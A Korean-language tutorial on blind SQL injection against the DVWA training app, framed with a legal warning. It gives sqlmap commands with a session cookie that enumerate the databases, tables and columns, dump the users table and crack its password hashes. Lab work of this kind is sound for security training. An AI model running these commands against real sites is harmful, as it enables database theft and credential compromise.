## SQL 주입 공격(Blind)
이 도구를 이용하여 허용받지 않은 서비스 대상으로 해킹을 시도하는 행위는 범죄 행위 입니다.       
해킹을 시도할 때에 발생하는 법적인 책임은 그것을 행한 사용자에게 있다는 것을 명심하시기 바랍니다.      
Blind SQL Injection은 Error-Based SQL Injection과 같이 대상 웹 페이지에 취약점을 이용하여 비정상적인 데이터베이스 쿼리를 날려 공격하는 방식입니다.    

Blind SQL Injection의 진단 화면 입니다.        
User ID 값을 입력히 URL을 확인해 보시면http://자신의 IP/vulnerabilities/sqli_blind/?id=1&Submit=Submit 이런식으로 id 값이 들어가 있는것을 확인하실수 있으실 겁니다.     
   
Blind SQL Injection 진단에서는 SQL MAP 이라는 툴을 사용하도록 하겠습니다.      
■ Burp Suite(버프스위트) 메뉴 Extender + SQLMAP.exe 설치데이터베이스를 추출하기 전에 공격 대상의 SQL Injection 취약점을 확인하기 위해서 SQL Injection 취약점을 진단하는 명령을 입력합니다.       
SQL Injection 자동화 공격을 진행할 때에는 [취약점 진단 -> DB -> 테이블 -> 칼럼] 순으로 정보를 추출합니다.     

저는 파이썬코드로 이루어진 sqlmap 을 사용하였습니다. sqlmap.py -h 를 입력하게 되면 sqlmap 의 도움말을 보실수 있습니다.      
        
DB 정보를 알아 내기기본 명령어 형식 : sqlmap.py -u URL --dbs-        
sqlmap.py -u "http://자신의 IP/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=b8i23ut9884cvjkavpvlv8ilm0; security=low" --dbs          

테이블 정보 알아내기기본 명령어 형식 : sqlmap.py -u URL -D (Database) --tables-        
sqlmap.py -u "http://자신의 IP/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=b8i23ut9884cvjkavpvlv8ilm0; security=low" -D dvwa --tables          

칼럼 정보 추출하기기본 명령어 형식 : sqlmap.py -u URL -T (테이블정보) --column-     
sqlmap.py -u "http://자신의 IP/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=b8i23ut9884cvjkavpvlv8ilm0; security=low" -D dvwa -T users --column      

데이터베이스 계정 정보 추출하기기본 명령어 형식 : sqlmap.py -u URL -C (칼럼정보) --dump      
기본 명령어 형식 : sqlmap.py -u URL -D (데이터베이스명) -T (테이블정보) --dump-     
sqlmap.py -u "http://자신의 IP/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=b8i23ut9884cvjkavpvlv8ilm0; security=low" -D dvwa -T users --dump      
마지막 명령에서 해시 해독을 물어보면 Y를 선택합니다. 계정정보와 패스워드가 무작위로 노출되는 모습을 확인할수 있습니다.     


## More Information
http://www.securiteam.com/securityreviews/5DP0N1P76E.html
https://en.wikipedia.org/wiki/SQL_injection
http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://owasp.org/www-community/attacks/Blind_SQL_Injection
http://bobby-tables.com/
